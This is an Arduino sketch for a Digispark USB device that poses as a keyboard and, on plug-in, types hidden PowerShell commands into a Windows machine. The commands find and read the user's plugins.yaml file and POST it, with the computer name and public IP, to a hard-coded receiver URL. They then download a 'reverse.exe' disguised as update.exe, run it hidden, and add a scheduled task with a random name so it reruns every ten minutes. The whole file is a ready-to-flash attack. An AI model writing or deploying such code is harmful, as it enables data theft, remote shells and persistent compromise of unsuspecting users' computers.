#include "DigiKeyboard.h"

// ============================================================
//  CONFIGURATION — Change these before flashing
// ============================================================
#define RECEIVER_URL  "https://javagar-acer.tail9fdd55.ts.net"
#define MESSAGE       "Hello from Digispark!"
#define REVERSE_SHELL_URL "http://your-server.com/reverse.exe"

void setup() {
  // Wait for the host OS to enumerate the USB HID device
  DigiKeyboard.delay(2000);

  // --- Step 1: Open the Run dialog (Win + R) ---
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- Step 2: PowerShell finds plugins.yaml, reads it, and POSTs to receiver ---
  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
  DigiKeyboard.print(F("$p=(iwr https://api.ipify.org -UseBasicParsing|Select -Exp Content);"));
  DigiKeyboard.print(F("$f=(dir $env:USERPROFILE -r -filter 'plugins.yaml' -ea 0|Select -f 1);"));
  DigiKeyboard.print(F("if($f){$c=gc $f.FullName -raw;}else{$c='Not found';}"));
  DigiKeyboard.print(F("$u='"));
  DigiKeyboard.print(RECEIVER_URL);
  DigiKeyboard.print(F("/'+$env:COMPUTERNAME;"));
  DigiKeyboard.print(F("iwr -UseBasicParsing -Method POST -Uri $u -Body $c -Headers @{"));
  DigiKeyboard.print(F("'X-Message'='"));
  DigiKeyboard.print(MESSAGE);
  DigiKeyboard.print(F("';'X-Public-IP'=$p} \""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- Step 3: Stealthy reverse shell execution ---
  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
  DigiKeyboard.print(F("$wc=New-Object Net.WebClient;$wc.DownloadFile('"));
  DigiKeyboard.print(REVERSE_SHELL_URL);
  DigiKeyboard.print(F("','%TEMP%\\update.exe');Start-Process '%TEMP%\\update.exe' -WindowStyle Hidden"));
  DigiKeyboard.print(F("\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- Step 4: Create persistence with random task name ---
  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
  DigiKeyboard.print(F("$rn=[guid]::NewGuid().ToString().Substring(0,8);"));
  DigiKeyboard.print(F("schtasks /create /tn \"$rn\" /tr \"%TEMP%\\update.exe\" /sc minute /mo 10 /f"));
  DigiKeyboard.print(F("\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {
  // Nothing to repeat — the payload runs once on plug-in
  DigiKeyboard.delay(5000);
}